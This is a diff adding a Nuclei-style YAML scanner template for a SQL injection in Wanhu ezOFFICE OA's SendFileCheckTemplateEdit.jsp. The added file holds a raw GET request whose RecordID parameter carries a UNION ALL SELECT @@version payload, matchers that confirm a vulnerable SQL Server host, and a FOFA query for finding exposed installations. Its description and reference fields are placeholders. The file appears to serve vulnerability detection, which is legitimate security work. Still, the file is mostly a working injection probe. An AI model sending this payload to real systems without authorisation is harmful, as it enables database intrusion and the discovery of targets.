@@ -1,0 +1,32 @@
+id: WanHuOA-SendFileCheckTemplateEdit-SQL
+
+info:
+  name: 万户OA-SendFileCheckTemplateEdit-SQL注入
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="万户ezOFFICE协同管理平台"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'+UNION+ALL+SELECT+@@version,NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate, br
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL Server"
+      - type: status
+        status:
+          - 200
